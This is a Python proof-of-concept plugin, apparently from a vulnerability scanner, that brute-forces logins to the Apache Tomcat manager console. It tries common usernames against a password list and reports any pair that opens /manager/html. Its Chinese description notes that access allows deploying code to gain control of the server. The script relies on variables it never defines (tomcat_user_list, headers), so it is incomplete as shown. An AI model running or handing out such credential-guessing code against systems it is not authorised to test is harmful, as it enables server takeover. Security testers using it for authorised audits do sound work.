#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import requests
from urllib.parse import urlparse

def get_plugin_info():
    plugin_info = {
        "name": "Tomcat弱口令",
        "desc": "攻击者通过此漏洞可以登陆管理控制台，通过部署功能可直接获取服务器权限。",
        "grade": "高",
        "type": "web",
        "keyword": "tag:tomcat",
    }
    return plugin_info

def poc(arg):
    arg = arg if "://" in arg else f"http://{arg}"
    timeout = 5
    user_list = ['admin', 'manager', 'tomcat', 'apache', 'root']
    passwd_list = tomcat_user_list
    flag_list = ['/manager/html/reload', 'Tomcat Web Application Manager']
    error_i=0
    for user in user_list:
        for passwd in passwd_list:
            try:
                r = requests.get(
                    url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}/manager/html', 
                    auth=(user,passwd),
                    verify=False,
                    headers=headers,
                    timeout=timeout)
            except requests.exceptions.ConnectionError:
                return
            except requests.HTTPError:
                return
            except:
                error_i += 1
                if error_i >= 3:
                    return
                continue
            if r.status_code == 404: 
                return
            if r.status_code == 401 or r.status_code == 403: 
                continue
            for flag in flag_list:
                if flag in r.text:
                    return f'{arg}\t{user}/{passwd}'
    return False

if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} URL".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  
